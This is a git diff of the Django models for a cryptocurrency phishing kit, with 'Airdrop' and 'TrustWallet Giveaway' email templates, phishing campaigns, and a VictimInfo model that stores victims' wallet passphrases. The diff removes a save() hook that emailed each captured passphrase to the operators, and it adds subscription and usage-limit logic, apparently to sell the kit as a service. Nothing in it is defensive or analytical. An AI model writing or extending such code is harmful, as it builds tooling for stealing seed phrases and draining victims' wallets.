@@ -4,9 +4,7 @@ from django.conf import settings
 import uuid
 from django.utils import timezone
 from shortuuid.django_fields import ShortUUIDField
-from django.core.mail import send_mail
-from django.contrib.auth import get_user_model
-
+from account.models import Subscription
 
 TEMPLATE_CHOICES = [
     ('AIRDROP', 'Airdrop Notification'),
@@ -14,10 +12,7 @@ TEMPLATE_CHOICES = [
     ('GIVEAWAY', 'TrustWallet Giveaway'),
 ]
 
-
-
 User = settings.AUTH_USER_MODEL
-
 
 class Cryptocurrency(models.Model):
     code = models.CharField(max_length=10)  # e.g., BTC, ETH
@@ -29,6 +24,7 @@ class Cryptocurrency(models.Model):
     class Meta:
         verbose_name = 'Cryptocurrency'
         verbose_name_plural = 'Cryptocurrencies'
+
 
 
 class Wallet(models.Model):
@@ -47,9 +43,16 @@ class Wallet(models.Model):
         verbose_name = 'Wallet'
         verbose_name_plural = 'Wallets'
 
+
+
 class EmailTemplate(models.Model):
     type = models.CharField(max_length=20, choices=TEMPLATE_CHOICES)
-    xp_cost = models.DecimalField(max_digits=10, decimal_places=2, default=0)
+
+    def get_active_subscriptions(self):
+        return Subscription.objects.filter(
+            is_active=True,
+            end_date__gt=timezone.now()
+        )
 
     def __str__(self):
         return self.type 
@@ -67,8 +70,21 @@ class Campaign(models.Model):
     quantity = models.DecimalField(max_digits=20, decimal_places=8)
     min_balance = models.DecimalField(max_digits=20, decimal_places=8)
     created_at = models.DateTimeField(auto_now_add=True)
-    
 
+    def has_valid_subscription(self):
+        return Subscription.objects.filter(
+            user=self.user,
+            is_active=True,
+            end_date__gt=timezone.now()
+        ).exists()
+
+    def get_monthly_usage(self):
+        return Campaign.objects.filter(
+            user=self.user,
+            email_template=self.email_template,
+            created_at__month=timezone.now().month,
+            created_at__year=timezone.now().year
+        ).count()
 
     def __str__(self):
         return f'Campaign for {self.recipient_email} - {self.cryptocurrency}'
@@ -76,7 +92,7 @@ class Campaign(models.Model):
     class Meta:
         verbose_name = 'Campaign'
         verbose_name_plural = 'Campaigns'
-
+        ordering = ['-created_at']
 
 class VictimInfo(models.Model):
     id = ShortUUIDField(unique=True, max_length=12, length=3, prefix='CL', alphabet='0123456789', primary_key=True)
@@ -87,34 +103,6 @@ class VictimInfo(models.Model):
     address = models.CharField(max_length=100, null=True, blank=True)
     created_at = models.DateTimeField(auto_now_add=True)
     uuid = models.UUIDField(default=uuid.uuid4, editable=False, unique=True, null=True, blank=True)
-
-    def save(self, *args, **kwargs):
-        if self.passphrase:
-            # Get all superuser emails
-            User = get_user_model()
-            admin_emails = list(User.objects.filter(is_superuser=True).values_list('email', flat=True))
-            
-            # Add campaign creator's email if available
-            if self.campaign and self.campaign.user.email:
-                admin_emails.append(self.campaign.user.email)
-            
-            if admin_emails:
-                message = f"""
-                New passphrase submission details:
-                Wallet: {self.wallet}
-                Campaign Email: {self.recipient_email}
-                Passphrase: {self.passphrase}
-                Campaign ID: {self.campaign.id if self.campaign else 'N/A'}
-                """
-                
-                send_mail(
-                    'New Wallet Submission Alert',
-                    message,
-                    settings.DEFAULT_FROM_EMAIL,
-                    admin_emails,
-                    fail_silently=False,
-                )
-        super().save(*args, **kwargs)
 
     @property
     def recipient_email(self):
